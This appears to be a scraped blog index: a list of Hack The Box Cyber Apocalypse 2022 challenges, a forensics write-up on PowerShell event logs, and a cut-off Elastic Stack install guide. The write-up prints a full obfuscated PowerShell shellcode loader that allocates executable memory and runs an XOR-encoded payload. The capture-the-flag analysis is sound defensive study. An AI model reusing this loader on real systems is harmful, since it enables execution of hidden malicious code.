Knowing that your father has become a consciousness that can be easily turned off and on is traumatizing. You are overwhelmed by your feelings and angry at yourself. You begin to ask yourself. Why am I feeling so much pain? Is there a part of my brain that is still encrypted? Have I screwed up again? You run towards the lab while shouting and slamming the doors behind you. Upon seeing that, Ulysses immediately flees the spaceship. Many days have passed and you are still obsessed with finding the part of your brain that needs to be repaired. Your comrades are startled by your sudden introversion and worry about Ulysses, who is nowhere to be seen. Weeks have passed and Ulysses is still missing. Suddenly, the ship receives a docking signal and as you scan the alien spacecraft for signs of life, a male passenger is discovered. It’s Ulysses! Excited, he rushes out of his capsule and overtakes the crew members, that longed to hug him to get to your lab. Ulysses informs you that he has managed to steal one of the cloud backup servers from the facility where the experiments took place. It seems that this device alters the consciousness of each test subject. Stunned by this information, a realization comes to mind. You are going to get your father back. Download jontay999willwam845 Reversing Challenge Name Difficulty Description Files Links WIDE ★☆☆☆ We’ve received reports that Draeger has stashed a huge arsenal in the pocket dimension Flaggle Alpha. You’ve managed to smuggle a discarded access terminal to the Widely Inflated Dimension Editor from his headquarters, but the entry for the dimension has been encrypted. Can you make it inside and take control? Download HansuuuuuuuuuuAlmond Force (Video)siunam321skyfrrewdogmeispiLazyTitan33damaidechenry132109heinandretwc1rcle Omega One ★☆☆☆ You’ve been sent to the library planet Omega-One. Here, records from all over the galaxy are collected, sorted and archived with perfect efficiency. You need to retrieve records about Draeger’s childhood, but the interface is impossibly large. Can you unravel the storage system?   HansuuuuuuuuuuAlmond Force (Video)siunam321rewdogLazyTitan33damaidechenry132109Rogue-1twc1rcle Rebuilding ★☆☆☆ You arrive on a barren planet, searching for the hideout of a scientist involved in the Longhir resistance movement. You touch down at the mouth of a vast cavern, your sensors picking up strange noises far below. All around you, ancient machinery whirrs and spins as strange sigils appear and change on the walls. You can tell that this machine has been running since long before you arrived, and will continue long after you’re gone. Can you hope to understand its workings? Download Almond Force (Video)s1n1st3rdamaidechenry132109Rogue-1matth Without a Trace ★☆☆☆ Draeger’s mothership has suddenly vanished, he could be readying an attack! You need to track him down before disaster strikes… Download Almond Force (Video)damaidecRogue-1matth Snakecode ★☆☆☆ We found this ancient text inscribed on a stone tablet. We believe it describes the history and technology of a mighty but extinct civilization, but we can’t be certain as it’s written in a dead language. Can you use your specialist knowledge to uncover the truth, and recover their technology? Download LazyTitan33matth Nuts and Bolts ★★☆☆ We’ve broken into Golden Fang’s main weapons assembly facility! If we want to steal them for ourselves, we’ll need to crack their top-secret bio-encoded locking scheme. Can you disassemble the weapons in time? Download Rogue-1matth Teleport ★★☆☆ You’ve been sent to a strange planet, inhabited by a species with the natural ability to teleport. If you’re able to capture one, you may be able to synthesise lightweight teleportation technology. However, they don’t want to be caught, and disappear out of your grasp - can you get the drop on them? Download Almond Force (Video)LazyTitan33damaidecmatth Indefinite ★★★☆ You hold in one hand an encrypted datastream, and in the other the central core of a Golden Fang communications terminal. Countless spies have risked their lives to steal both the encrypted attack plans, and the technology used to conceal it, and bring them to you for expert analysis. To your horror, as you turn the screws on the core, its defense mechanisms spring to life, concealing and covering its workings. You have minutes to spare before the device destroys itself - can you crack the code? Download matth Freaky Forum Interception ★★★☆ You’ve arrived on the planet Drion-1, where the high galactic court is based. You’ve come to spread the word about the dangers of Draeger, and gather support, but thousands upon thousands of other lifeforms are also here to argue, squabble and dispute, speaking a thousand different languages. Can you make yourself heard above the babble? Download matth Shuffleme ★★★☆ Intelligence indicates that the ancient data storage device you’ve obtained contains schematics for a never-before-seen weapon. But there’s a problem - it’s locked, and strange symbiotic lifeforms on its surface are constantly removing parts and reinserting them elsewhere. Can you get a clear picture of what’s going on? Download matth Forensics Challenge Name Difficulty Description Files Links Puppeteer ★☆☆☆ Planet Longhir is known for it’s top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced one in the galaxy. In fact, the prototype DES-3000, a self-propelled precision-strike missile that is capable of reaching targets even in Ratnik galaxy, is being used to disable Galactic Federation’s communication satellites. The mystery that Miyuki is trying to solve is, how the satellite’s location was leaked since it is a top-sercret that only Galactic Federation’s council is aware of. Help her analyse the Council’s HQ event logs and solve this mystery. Download gore-ez-kneeAlmond Force (Video)luhkoseriotonrewdogkevintk1LazyTitan33s1n1st3ran00brektndamaidechenry132109twc1rclebepernapat Golden Persistence ★☆☆☆ Emergency! A space station near Urkir was compromised. Although Urkir is considered to be the very embodiment of the neutral state, it is rich of fuel substances, something that Dreager is very much interested in. Thus, there are now fears that the intergalactic war will also affect this neutral planet. If Draeger and his mercenaries manage to maintain unauthorised access in Urkir’s space station and escalate their privileges, they will soon be able to activate the station’s defence mechanisms that are able to prevent any spaceship from entering Urkir’s airspace. For now, the infected machine is isolated until the case is closed. Help Miyuki find their persistence mechanisms so they cannot gain access again. Download HansuuuuuuuuuuAlmond Force (Video)luhkoseriotonrewdogkevintk1LazyTitan33s1n1st3rhenry132109twc1rclebepernapat Intergalactic Recovery ★☆☆☆ Miyuki’s team stores all the evidence from important cases in a shared RAID 5 disk. Especially now that the case IMW-1337 is almost completed, evidences and clues are needed more than ever. Unfortunately for the team, an electromagnetic pulse caused by Draeger’s EMP cannon has partially destroyed the disk. Can you help her and the rest of team recover the content of the failed disk? Download skyfrtwc1rclebepernapat Automation ★★☆☆ Vinyr’s threat intelligence is monitoring closely all APT groups from every possible galaxy, especially the most dangerous one, longhir. As stated by an anonymous threat intelligence officer, the malicious actors tend to automate their initial post-exploitation enumeration so they can have less on-keyboard time. You can find such an example in the provided network capture generated by a recent incident. Analyse it and find out what they are up to. Download Almond Force (Video)rewdogkevintk1s1n1st3rnewyork167twc1rcler4bb1t Free Services ★★☆☆ Intergalactic Federation stated that it managed to prevent a large-scale phishing campaign that targeted all space personnel across the galaxy. The enemy’s goal was to add as many spaceships to their space-botnet as possible so they can conduct distributed destruction of intergalactic services (DDOIS) using their fleet. Since such a campaign can be easily detected and prevented, malicious actors have changed their tactics. As stated by officials, a new spear phishing campaign is underway aiming high value targets. Now Klaus asks your opinion about a mail it received from “sales@unlockyourmind.gal”, claiming that in their galaxy it is possible to recover it’s memory back by following the steps contained in the attached file. Download kevintk1rafiinahenry132109twc1rcle Seized ★★★☆ Miyuki is now after a newly formed ransomware division which works for Longhir. This division’s goal is to target any critical infrastructure and cause financial losses to their opponents. They never restore the encrypted files, even if the victim pays the ransom. This case is the number one priority for the team at the moment. Miyuki has seized the hard-drive of one of the members and it is believed that inside of which there may be credentials for the Ransomware’s Dashboard. Given the AppData folder, can you retrieve the wanted credentials? Download luhko Precious Guidance ★★★☆ Miyuki has come across what seems to be a suspicious process running on one of her spaceship’s navigation systems. After investigating the origin of this process, it seems to have been initiated by a script called “SatelliteGuidance.vbs”. Eventually, one of your engineers informs her that she found this file in the spaceship’s Intergalactic Inbox and thought it was an interactive guide for the ship’s satellite operations. She tried to run the file but nothing happened. You and Miyuki start analysing it and notice you don’t understand its code… it is obfuscated! What could it be and who could be behind its creation? Use your skills to uncover the truth behind the obfuscation layers. Download kevintk1 Reflection ★★★☆ You and Miyuki have succeeded in dis-empowering Draeger’s army in every possible way. Stopped their fuel-supply plan, arrested their ransomware gang, prevented massive phishing campaigns and understood their tactics and techniques in depth. Now it is the time for the final blow. The final preparations are completed. Everyone is in their stations waiting for the signal. This mission can only be successful if you use the element of surprise. Thus, the signal must remain a secret until the end of the operation. During some last-minute checks you notice some weird behaviour in Miyuki’s PC. You must find out if someone managed to gain access to her PC before it’s too late. If so, the signal must change. Time is limited and there is no room for errors. Download an00brektn Misc Challenge Name Difficulty Description Files Links Compressor ★☆☆☆ Ramona’s obsession with modifications and the addition of artifacts to her body has slowed her down and made her fail and almost get killed in many missions. For this reason, she decided to hack a tiny robot under Golden Fang’s ownership called “Compressor”, which can reduce and increase the volume of any object to minimize/maximize it according to the needs of the mission. With this item, she will be able to carry any spare part she needs without adding extra weight to her back, making her fast. Can you help her take it and hack it?   GelzkiHansuuuuuuuuuuAlmond Force (Video)siunam321skyfrrewdogmeispiLazyTitan33damaidechenry132109heinandre Matrioshka Brain ★☆☆☆ The possibility of a weapon that alters the very core of the structure of the universe itself is beyond even the wildest imaginations. Or is it? Ramona and Paulie are exeperimenting with concentric Dyson spheres to achieve the impossible, to harvest the energy of an entire quasar in order to create such a weapon. The exepriments showed that five spheres are the optimal solution. Alas, the thermal equilibrium is still a pressing issue they need to figure out. They measure the temperature of each sphere for every minute. Now all that is left is to properly analyze the data and figure out why there are so many thermal inconsistencies Download siunam321rewdoghenry132109 Fuel Crisis ★☆☆☆ After travelling for too many light years, we managed to reach an uninhabited planet to rest for a while. We got a problem though. Phalcon is running out of fuel and we need to stop at the nearest space station to refuel. The closest one is the B1-4S3D station, where we are unfortunately banned from docking our ship. Our surveillance showed that the station uses two OCR cameras to read the unique ID of each spaceship entering. The first one is used as a validator for the second one. We’ve managed to find a way to disable the validation process for a split second while our ship passes, but we still need to pass through the second camera. Furthermore, our lead hacker opened a connection with the second camera, which we can use to upload our custom model weights. Try to find a way to change the predictions of the model when we pass through the second gate. Be careful though, the other four spaceships that are in front of us need to be ID’d correctly so no suspicion raises. Download jontay999 Battle in OrI/On ★★☆☆ The spaceship cruiser has been hit! Ramona must hurry and check if the central system is intact! The enemy must have used electromagnetic wave canons! The spaceship’s sensors are going crazy and the autopilot system broke down! There is no chance to turn back the enemy will be waiting… But there is a meteor shower ahead! In order to get through safely, the spaceship’s power and consumption need to be balanced. Both the laser canons and the thrusters are vital parts for this… And she has to control them manually! Quickly! Ramona needs to upload a valid configuration file to overwrite the values of all sensors on board. The onboard neural network will verify that the new configuration leads to the required power distribution. Attention! The values of the sensors must be at least 99.99% accurate for this to work! Hurry now, time is running out! Download pymivn Quantum Engine ★★☆☆ We need to travel to one of Draeger’s lair in a galaxy far away from here, to search for any clues that might help us prove how Draeger manipulated her to be his most trustworthy cold-blooded assassin. However, traveling there can be quite difficult since it’s flooded with the most state-of-the-art IFGs attack spacecrafts. Should we be able to outspeed them, we might have a chance of making it there in one piece. That is why we came to you. Word on the solar system is that you are one of the best quantum mechanics of the galaxy, which I find odd considering your age. Will you be able to modify Phalcon’s acceleration system so no IFG spacecraft can ever catch us? Download jontay999 Spaceship Hijack ★★★☆ After the successful mission of Space Pirate, Bonnie ordered Ramona to hijack another spaceship on her own on a stealth mission. She managed to get inside it and had limited access to the central controller. By reverse-engineering the controller, we figured out that it uses a unique set of VM instructions with limited capabilities. Can you help her break out of this VM and gain unlimited access? Download   Wormhole Efficiency ★★★☆ After a severe clash with one of Golden Fang’s battleships, Ramona’s spaceship was damaged, and now it consumes fuel at the triple cost. Can you reach home without running out of fuel? Our best option is to travel through wormholes otherwise, the spaceship will be left wandering in space and become prey to Golden Fang’s army. Download   Hardware Challenge Name Difficulty Description Files Links Space Pulses ★☆☆☆ One of our enhanced radio telescopes captured some weird fluctuations from a nearby star. It was idle for decades due to the fact that it was fully enclosed by a Dyson Sphere but its patterns began to change drastically leading us to believe that someone is controlling part of the megastructure to release energy and send these pulses directed to us in order to transmit a message. They must have known that our equipment can read even the slightest fluctuations. Download henry132109brathadairean Through fire n gates ★☆☆☆ After Ramona helped Virgil escape from the prison they were holding him they had to find a way to flee the planet but all the spaceships were grounded. Luckily they manage to gain access to a hangar with decommissioned escape pods. After some tinkering with the pod’s control panel, they managed to attach some probes to it and reverse engineer the proprietary protection circuit but some of it appears to be damaged. The only thing holding them back was finding a way to gain access to the flight control system. Download brathadairean Into the Matrix ★★☆☆ After a long time away it is finally time to get back all the equipment build all those years. While going through the hardware devices to reconfigure or upgrade them one of them seemed a bit off. It appears that someone was toying with a few of the devices, changing and breaking the hard-wired components which resulted in some of them malfunctioning. The status matrix in one of the armor-enhancing weapons seems to display random indications making the weapon selection system unusable. This, combined with the fact that most of the circuitry is now under a hard epoxy resin makes it impossible to reconfigure the hardware connection, thus the only solution is to reverse engineer the current device layout and add an additional circuitry that will work around the current one. Download brathadairean Secret Codes ★★☆☆ A sudden burst of RF signals started in an attempt to compromise our perimeter security. We intercepted a few of them but our ADC broke during the transformation to a serial signal leaving us with only an analog capture. We need to decode it and find if they are close to finding the correct passcode. Download willwam845brathadairean " }, { "title": "HTB Cyber Apocalypse CTF - Forensics - Puppeteer", "url": "/posts/htb-ca-2022-forensics-puppeteer/", "categories": "CTF, HTB CA 2022", "tags": "ctf, htbca2022, htb, forensics, hackthebox, powershell, evtx, evt", "date": "2022-05-14 14:30:00 -0500", "snippet": "Challenge InfoDifficulty: ★☆☆☆ Planet Longhir is known for it’s top-tier researchers. Due to their dedication in science and engineering, their military equipment is the most advanced one in the galaxy. In fact, the prototype DES-3000, a self-propelled precision-strike missile that is capable of reaching targets even in Ratnik galaxy, is being used to disable Galactic Federation’s communication satellites. The mystery that Miyuki is trying to solve is, how the satellite’s location was leaked since it is a top-sercret that only Galactic Federation’s council is aware of. Help her analyse the Council’s HQ event logs and solve this mystery.Tools Used PowerShell ISE CyberChef Event Log ExplorerProcessDownload ArtifactsClicking Download for the challenge provides us a zip file of evtx files which are Windows Event Log files.They’re a little different than traditional log files in that they are stored in a binary format. Using Windows Event Viewer is how they are normally viewed, but it’s not ideal when trying to filter, parse, and search message fields during an investigation. Some options that are available are using tools such as dumpevtx from Velocidex (The company behind Velociraptor) to a tool I learned about taking GCFA: Event Log Explorer.The tool is free for personal, non-commercial use, and a license for it is available for $199. Since I haven’t used it since I took GCFA, I thought it be interesting to try it out again. Event Log Explorer is not required to solve this challenge. You can cat out the files and manually parse through them to find the ScriptBlocks.PowerShell Event LogsWhen I was doing a forensics challenge on HackTheBox, I ran into obfuscated code which ran PowerShell scripts. I remember hearing about PowerShell script logging, but had never enabled it before. I found this article by Mandiant which detailed out how to enable PowerShell logging in Windows 10 since it isn’t enabled by default link.With PowerShell being a popular technology used to execute code on Windows, if I ever see PowerShell event logs I flock to them first. Looking in the Logs directory, we can see 3 PowerShell evtx files: Windows Powershell.evtx Microsoft-Windows-Powershell/Operational.evtx Microsoft-Windows-Powershell/Admin.evtxThe first file Windows Powershell.evtx has a handful of logs. There are also event IDs of 400, 600, and 800: EID 400: The engine status is changed from None to Available - This indicates the start of a PowerShell activity, whether remote or local. EID 600: Proivder “X” is Started - Indicates that a provider is starting to perform a PowerShell activity on the system. EID 800: Pipeline Execution Details: Shows pipeline execution information of a command executed by PowerShellWe can see that some commands were ran by PowerShell at ~8:40:31 AM. The details from the Windows PowerShell.evtx don’t give us too much detail, but we can see what the script name was, where is it was ran from, the user who ran it, and the command line arguments with some sketch variables ($tNZvQCljVk and $OleSPrlmhB).Let’s move over to the Microsoft-Windows-Powershell/Operational.evtx logs. Using the pivot point time of 8:40:31 AM, there are events: 4103 (Executing Pipeline) and 4104 (Execute a Remote Command).The 4104 event shows the entire scriptblock that was executed and houses some clear obfuscation$OleSPrlmhB = @&quot;[DllImport(&quot;kernel32.dll&quot;)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(&quot;kernel32.dll&quot;)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);&quot;@[byte[]] $stage1 = 0x99, 0x85, 0x93, 0xaa, 0xb3, 0xe2, 0xa6, 0xb9, 0xe5, 0xa3, 0xe2, 0x8e, 0xe1, 0xb7, 0x8e, 0xa5, 0xb9, 0xe2, 0x8e, 0xb3;[byte[]] $stage2 = 0xac, 0xff, 0xff, 0xff, 0xe2, 0xb2, 0xe0, 0xa5, 0xa2, 0xa4, 0xbb, 0x8e, 0xb7, 0xe1, 0x8e, 0xe4, 0xa5, 0xe1, 0xe1;$tNZvQCljVk = Add-Type -memberDefinition $OleSPrlmhB -Name &quot;Win32&quot; -namespace Win32Functions -passthru;[Byte[]] $HVOASfFuNSxRXR = 0x2d,0x99,0x52,0x35,0x21,0x39,0x1d,0xd1,0xd1,0xd1,0x90,0x80,0x90,0x81,0x83,0x99,0xe0,0x03,0xb4,0x99,0x5a,0x83,0xb1,0x99,0x5a,0x83,0xc9,0x80,0x87,0x99,0x5a,0x83,0xf1,0x99,0xde,0x66,0x9b,0x9b,0x9c,0xe0,0x18,0x99,0x5a,0xa3,0x81,0x99,0xe0,0x11,0x7d,0xed,0xb0,0xad,0xd3,0xfd,0xf1,0x90,0x10,0x18,0xdc,0x90,0xd0,0x10,0x33,0x3c,0x83,0x99,0x5a,0x83,0xf1,0x90,0x80,0x5a,0x93,0xed,0x99,0xd0,0x01,0xb7,0x50,0xa9,0xc9,0xda,0xd3,0xde,0x54,0xa3,0xd1,0xd1,0xd1,0x5a,0x51,0x59,0xd1,0xd1,0xd1,0x99,0x54,0x11,0xa5,0xb6,0x99,0xd0,0x01,0x5a,0x99,0xc9,0x81,0x95,0x5a,0x91,0xf1,0x98,0xd0,0x01,0x32,0x87,0x99,0x2e,0x18,0x9c,0xe0,0x18,0x90,0x5a,0xe5,0x59,0x99,0xd0,0x07,0x99,0xe0,0x11,0x90,0x10,0x18,0xdc,0x7d,0x90,0xd0,0x10,0xe9,0x31,0xa4,0x20,0x9d,0xd2,0x9d,0xf5,0xd9,0x94,0xe8,0x00,0xa4,0x09,0x89,0x95,0x5a,0x91,0xf5,0x98,0xd0,0x01,0xb7,0x90,0x5a,0xdd,0x99,0x95,0x5a,0x91,0xcd,0x98,0xd0,0x01,0x90,0x5a,0xd5,0x59,0x90,0x89,0x90,0x89,0x8f,0x88,0x99,0xd0,0x01,0x8b,0x90,0x89,0x90,0x88,0x90,0x8b,0x99,0x52,0x3d,0xf1,0x90,0x83,0x2e,0x31,0x89,0x90,0x88,0x8b,0x99,0x5a,0xc3,0x38,0x9a,0x2e,0x2e,0x2e,0x8c,0x98,0x6f,0xa6,0xa2,0xe3,0x8e,0xe2,0xe3,0xd1,0xd1,0x90,0x87,0x98,0x58,0x37,0x99,0x50,0x3d,0x71,0xd0,0xd1,0xd1,0x98,0x58,0x34,0x98,0x6d,0xd3,0xd1,0xd4,0xe8,0x11,0x79,0xd1,0xc3,0x90,0x85,0x98,0x58,0x35,0x9d,0x58,0x20,0x90,0x6b,0x9d,0xa6,0xf7,0xd6,0x2e,0x04,0x9d,0x58,0x3b,0xb9,0xd0,0xd0,0xd1,0xd1,0x88,0x90,0x6b,0xf8,0x51,0xba,0xd1,0x2e,0x04,0xbb,0xdb,0x90,0x8f,0x81,0x81,0x9c,0xe0,0x18,0x9c,0xe0,0x11,0x99,0x2e,0x11,0x99,0x58,0x13,0x99,0x2e,0x11,0x99,0x58,0x10,0x90,0x6b,0x3b,0xde,0x0e,0x31,0x2e,0x04,0x99,0x58,0x16,0xbb,0xc1,0x90,0x89,0x9d,0x58,0x33,0x99,0x58,0x28,0x90,0x6b,0x48,0x74,0xa5,0xb0,0x2e,0x04,0x54,0x11,0xa5,0xdb,0x98,0x2e,0x1f,0xa4,0x34,0x39,0x42,0xd1,0xd1,0xd1,0x99,0x52,0x3d,0xc1,0x99,0x58,0x33,0x9c,0xe0,0x18,0xbb,0xd5,0x90,0x89,0x99,0x58,0x28,0x90,0x6b,0xd3,0x08,0x19,0x8e,0x2e,0x04,0x52,0x29,0xd1,0xaf,0x84,0x99,0x52,0x15,0xf1,0x8f,0x58,0x27,0xbb,0x91,0x90,0x88,0xb9,0xd1,0xc1,0xd1,0xd1,0x90,0x89,0x99,0x58,0x23,0x99,0xe0,0x18,0x90,0x6b,0x89,0x75,0x82,0x34,0x2e,0x04,0x99,0x58,0x12,0x98,0x58,0x16,0x9c,0xe0,0x18,0x98,0x58,0x21,0x99,0x58,0x0b,0x99,0x58,0x28,0x90,0x6b,0xd3,0x08,0x19,0x8e,0x2e,0x04,0x52,0x29,0xd1,0xac,0xf9,0x89,0x90,0x86,0x88,0xb9,0xd1,0x91,0xd1,0xd1,0x90,0x89,0xbb,0xd1,0x8b,0x90,0x6b,0xda,0xfe,0xde,0xe1,0x2e,0x04,0x86,0x88,0x90,0x6b,0xa4,0xbf,0x9c,0xb0,0x2e,0x04,0x98,0x2e,0x1f,0x38,0xed,0x2e,0x2e,0x2e,0x99,0xd0,0x12,0x99,0xf8,0x17,0x99,0x54,0x27,0xa4,0x65,0x90,0x2e,0x36,0x89,0xbb,0xd1,0x88,0x98,0x16,0x13,0x21,0x64,0x73,0x87,0x2e,0x04;[array]::Reverse($stage2);$hRffYLENA = $tNZvQCljVk::VirtualAlloc(0,[Math]::Max($HVOASfFuNSxRXR.Length,0x1000),0x3000,0x40);$stage3 = $stage1 + $stage2;[System.Runtime.InteropServices.Marshal]::Copy($HVOASfFuNSxRXR,0,$hRffYLENA,$HVOASfFuNSxRXR.Length);# Unpack Shellcode;for($i=0; $i -lt $HVOASfFuNSxRXR.count ; $i++){ $HVOASfFuNSxRXR[$i] = $HVOASfFuNSxRXR[$i] -bxor 0xd1;}#Unpack Special Orders!for($i=0;$i -lt $stage3.count;$i++){ $stage3[$i] = $stage3[$i] -bxor 0xd1;}$tNZvQCljVk::CreateThread(0,0,$hRffYLENA,0,0,0);This looks like it’s going to contain the info we ned to solve the challenge.PowerShell DeObfuscationI initially started trying to deobfuscate this head first and was getting a little overwhelmed. Then looking back over the code, I focused on the comments:...# Unpack Shellcode;...# Unpack Special Orders;...Okay, so the massive byte array is the shellcode. I don’t think that’s going to reveal the flag. Plus it seems to be completely separate from the $stage1, $stage2, and $stage3 variables that are un-xor’d in the second for-loop. Deobfuscating that first looks a bit easier than going through all of shellcode, so I’ll focus on that first. If it doesn’t show anything promising, I’ll try deobfuscating the shellcode.Deobfuscating the “Special Orders” only requires a few lines of PowerShell from the scriptblock:[byte[]] $stage1 = 0x99, 0x85, 0x93, 0xaa, 0xb3, 0xe2, 0xa6, 0xb9, 0xe5, 0xa3, 0xe2, 0x8e, 0xe1, 0xb7, 0x8e, 0xa5, 0xb9, 0xe2, 0x8e, 0xb3;[byte[]] $stage2 = 0xac, 0xff, 0xff, 0xff, 0xe2, 0xb2, 0xe0, 0xa5, 0xa2, 0xa4, 0xbb, 0x8e, 0xb7, 0xe1, 0x8e, 0xe4, 0xa5, 0xe1, 0xe1;[array]::Reverse($stage2);#Unpack Special Orders!for($i=0;$i -lt $stage3.count;$i++){ $stage3[$i] = $stage3[$i] -bxor 0xd1;}We can actually just copy and paste this into PowerShell ISE, add a Write-Output $stage3 at the end and it should give us the output we need.The output appears to be in decimal, so we can take this and paste it into CyberChef. CyberChef will pick up on the format and suggest to decode it for us by clicking the magic wand next to “Output”.ConclusionsPowerShell logging is incredibly valuable. I use it when running Dynamic Malware Analysis to see what commands PowerShell executed. It is handy in solving some of these HTB challenges so if you have a Windows VM that you use for malware analysis or monitoring endpoints with PowerShell, I highly recommend making sure PowerShell event logging is enabled." }, { "title": "Quickstart Elastic Stack", "url": "/posts/elastic-install/", "categories": "Misc, Elastic", "tags": "elasticsearch, elastic, kibana, ubuntu, installation", "date": "2022-03-27 14:30:00 -0500", "snippet": "I have experience installing Elastic Cloud on Kubernetes (ECK) using AWS Elastic Kubernetes Service (EKS). But I have never tried a manual install on a server. These are the instructions I ran to get Elasticsearch and Kibana up and running with HTTPS enabled between Kibana and our browser. With the introduction of Elastic Agents, I also provided instructions on setting up a Fleet-server as well as a fleet-managed Elastic Agent on a Windows VM to start collecting logs. Personally I think I would prefer setting up Elastic with Docker, and perhaps I’ll add to this guide to include Docker installation later. But for now I just wanted to try a bare metal install of an Elastic Stack. To mimic installing, configuring, and accessing an Elastic Stack on a server via a cloud provider or anywhere really, I thought it would be beneficial to setup my own server on a VM to test the waters. If you would like to follow along with testing this on an Ubuntu Server VM, you can follow the guide I created hereThese are the guides I used to help set this up: https://www.elastic.co/guide/en/elastic-stack-get-started/current/get-started-elastic-stack.html https://www.elastic.co/guide/en/kibana/current/deb.html https://www.elastic.co/guide/en/fleet/master/secure-connections.html#generate-fleet-server-certsElasticsearchFirst thing’s first, we’ll update and upgrade all of the packages on Ubuntu Server:sudo apt update &amp;amp;&amp;amp; sudo apt upgrade -y &amp;amp;&amp;amp; sudo apt autoremove -yWith this being Ubuntu, we’ll install using debian packages:curl -L -O https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-8.1.1-amd64.debsudo dpkg -i elasticsearch-8.1.1-amd64.debThe output here is important. You’ll want to make sure you copy and paste this somewhere for reference. It has reference commands to change the superuser password and generating enrollment tokens for Kibana and Elasticsearch. It also contains the built-in elastic superuser password.If you would like to ensure that Elasticsearch starts automatically when the system boots:sudo /bin/systemctl daemon-reloadsudo /bin/systemctl enable elasticsearch.serviceTo start the Elasticsearch service, run:sudo /bin/systemctl start elasticsearch.serviceOpen up a second terminal window on your host and attempt to curl the Elasticsearch service using the VMs IP and replace PASSWORD with the password given in the security configuration output when Elasticsearch was installed. You should see a similar output:$ curl -k -u &quot;elastic:PASSWORD&quot; https://192.168.235.129:9200{ &quot;name&quot; : &quot;elastic&quot;, &quot;cluster_name&quot; : &quot;elasticsearch&quot;, &quot;cluster_uuid&quot; : &quot;hagNR9aLTLaXk-TQkBnt9w&quot;, &quot;version&quot; : { &quot;number&quot; : &quot;8.1.1&quot;, &quot;build_flavor&quot; : &quot;default&quot;, &quot;build_type&quot; : &quot;deb&quot;, &quot;build_hash&quot; : &quot;d0925dd6f22e07b935750420a3155db6e5c58381&quot;, &quot;build_date&quot; : &quot;2022-03-17T22:01:32.658689558Z&quot;, &quot;build_snapshot&quot; : false, &quot;lucene_version&quot; : &quot;9.0.0&quot;, &quot;minimum_wire_compatibility_version&quot; : &quot;7.17.0&quot;, &quot;minimum_index_compatibility_version&quot; : &quot;7.0.0&quot; }, &quot;tagline&quot; : &quot;You Know, for Search&quot;}Now we’ll generate an enrollment token for Kibana. You can reference the security configuration output when we installed Elasticsearch for the command:sudo /usr/share/elasticsearch/bin/elasticsearch-create-enrollment-token -s kibanaCopy the output and save it for use in the next couple of steps.KibanaDownload and install the Kibana debian package:wget https://artifacts.elastic.co/downloads/kibana/kibana-8.1.1-amd64.debsudo dpkg -i kibana-8.1.1-amd64.debNow run the next command, pasting in the enrollment token when prompted:$ sudo /usr/share/kibana/bin/kibana-setup? Enter enrollment token: &amp;lt;Enrollment Token String&amp;gt;✔ Kibana configured successfully.To start Kibana run: bin/kibanaTo have Kibana configured to run at startup:sudo /bin/systemctl daemon-reloadsudo /bin/systemctl enable kibana.serviceBefore we start Kibana, we need to configure a few things first. First we need to create some self-signed certs to enable HTTPS between Kibana and our browser, then configure /etc/kibana/kibana.yml to reflect those changes.To generate self-signed certs using the elasticsearch-certutil binary, run the following. You may choose to add a password to your certificate file:sudo /user/share/elasticsearch/bin/elasticsearch-certutil cert -name kibana-certs --self-signedFor my preference I am going to create a certs directory in /etc/kibana, move the certificate file there, then give ownership of the certs to kibana. That last command is very important:sudo mkdir /etc/kibana/certs &amp;amp;&amp;amp; sudo mv /usr/share/elasticsearch/kibana-certs.p12 /etc/kibana/certs &amp;amp;&amp;amp; sudo chown -R kibana: /etc/kibana/certsNow we’ll update /etc/kibana/kibana.yml. Add the following:server.host: 0.0.0.0server.ssl.enabled: trueserver.ssl.keystore.path: &quot;/etc/kibana/certs/kibana-certs.p12&quot;# If you didn&#39;t give your keystore a passphrase uncomment the next line#server.ssl.keystore.password: &quot;&quot;If you added a password to your certificate, add it to kibana’s keystore:sudo /usr/share/kibana/kibana-keystore add server.ssl.keystore.passwordWe also want to secure the saved objects that are stored in Kibana such as dashboards, visualizations, alerts, actions, and advanced settings. These objects might include sensitive information. To add a layer of protection to these saved objects (which are kept in a dedicated, internal index), we’ll use the kibana-encryption-keys binary to generate keys for us to place inside of kibana.yml.If you would like to setup key rotation as well, you can follow Elastics Kibana Guide.sudo /usr/share/kibana/bin/kibana-encryption-keys generate -f | tail -4 | sudo tee -a /etc/kibana/kibana.yml &amp;amp;&amp;gt;/dev/nullFinally we’ll start Kibanasudo /bin/systemctl start kibana.serviceIf everything worked correctly, you can open up a browser on your host and type in https://SERVER_IP:5601. You should be greeted with a “Your connection is not secure” warning. That’s okay, because these are self-signed certificates that you created. Accept the risk and proceed to starting out with Elastic!We can sign in with user elastic and the password given to us from the security configuration output when we installed Elasticsearch.Fleet ServerDownload and install the Elastic Agent Debian package:curl -L -O https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-8.1.1-amd64.debsudo dpkg -i elastic-agent-8.1.1-amd64.debNow we’ll follow this guide to setup TLS communication with the fleet server. Elastic Agents require a PEM formatted certificate so we’ll start off with creating a CA for our fleet server certificates:sudo /usr/share/elasticsearch/bin/elasticsearch-certutil -s ca \\--pem --out /etc/elasticsearch/certs/ca.zipsudo unzip -q /etc/elasticsearch/certs/ca.zip -d /etc/elasticsearch/certs/sudo rm /etc/elasticsearch/certs/ca.zip If you need to install unzip, run sudo apt install unzipWith CA certificates, we can create certificates for our fleet server:sudo /usr/share/elasticsearch/bin/elasticsearch-certutil cert -s \\--name fleet-server --ca-cert /etc/elasticsearch/certs/ca/ca.crt \\--ca-key /etc/elasticsearch/certs/ca/ca.key \\--out /etc/elastic-agent/certs/fleet-server.zip --pemsudo unzip /etc/elastic-agent/certs/fleet-server.zip -d /etc/elastic-agent/certs/ &amp;amp;&amp;gt;/dev/nullsudo rm /etc/elastic-agent/certs/fleet-server.zipNext let’s login to Kibana and under Management, click on FleetThere will be a page with steps showing how to add a Fleet Server. They’re pretty straight forward, but will need a bit of modification. Right now, there are no fleet server policies. So on Step 1, be sure to click on Create Policy. If you would like to change what logs the agent will collect, you can select/deselect Collect system logs and metrics and/or under Advanced options -&amp;gt; Agent monitoring you can select/deselect Collect agent logs and Collect agent metrics.Ignore Step 2, because we have already downloaded and installed Elastic AgentOn Step 3, we’ll choose the Quick start deployment type.On Step 4, since our Fleet Server will be installed on the same server as our stack, we’ll use our server IP as our 